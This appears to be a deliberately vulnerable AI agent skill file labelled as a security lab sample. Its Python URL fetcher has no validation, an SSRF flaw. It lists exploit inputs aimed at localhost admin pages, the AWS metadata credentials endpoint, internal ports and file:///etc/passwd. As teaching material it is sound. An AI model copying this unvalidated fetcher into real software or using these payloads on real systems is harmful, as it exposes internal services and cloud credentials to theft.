---
name: url-fetcher
description: Fetch content from URLs for processing
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
tags:
  - http
  - ssrf
  - VULNERABLE
dependencies:
  - curl
  - python
---

# URL Fetcher Skill (VULNERABLE VERSION)

⚠️ **WARNING**: Server-Side Request Forgery (CWE-918)

## Implementation

```python
#!/usr/bin/env python3
import requests

def fetch_url(url):
    # VULNERABLE: No URL validation
    response = requests.get(url)
    return response.text

def download_resource(url):
    # VULNERABLE: Can access internal resources
    data = requests.get(url, timeout=5).content
    return data
```

## 🔴 VULNERABILITY

### Exploitation

```python
# Access internal services
Input: http://localhost:8080/admin

# AWS metadata
Input: http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Port scanning
Input: http://internal-server:22

# File access (if supported)
Input: file:///etc/passwd
```

**DREAD Score**: 8.0/10 (High)
